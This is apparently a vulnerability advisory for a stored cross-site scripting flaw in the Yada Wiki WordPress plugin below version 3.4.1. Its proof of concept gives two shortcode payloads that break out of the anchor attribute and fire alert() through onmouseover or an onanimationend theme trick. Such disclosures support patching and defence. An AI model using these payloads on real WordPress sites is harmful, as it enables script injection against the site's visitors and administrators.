## WordPress Plugin Vulnerabilities

# Yada Wiki < 3.4.1 - Contributor+ Stored XSS

### Description

The plugin did not sanitise, validate or escape the anchor attribute of its shortcode, leading to a Stored Cross-Site Scripting issue

### Proof of Concept

- Create a wiki page. If there is already a page, you can skip. The page can be a draft.
- Add this shortcode to a post/page, view it and move the mouse over the 'XSS' link to trigger the XSS [yadawiki link="PAGE\_NAME\_HERE" anchor='" onmouseover="alert(/XSS/)' show="xss"]
If the theme used is TwentyTwentyOne, the following payload can be used: [yadawiki link="PAGE\_NAME\_HERE" anchor='" style="animation-name:twentytwentyone-close-button-transition" onanimationend="alert(1)' show="xss"]
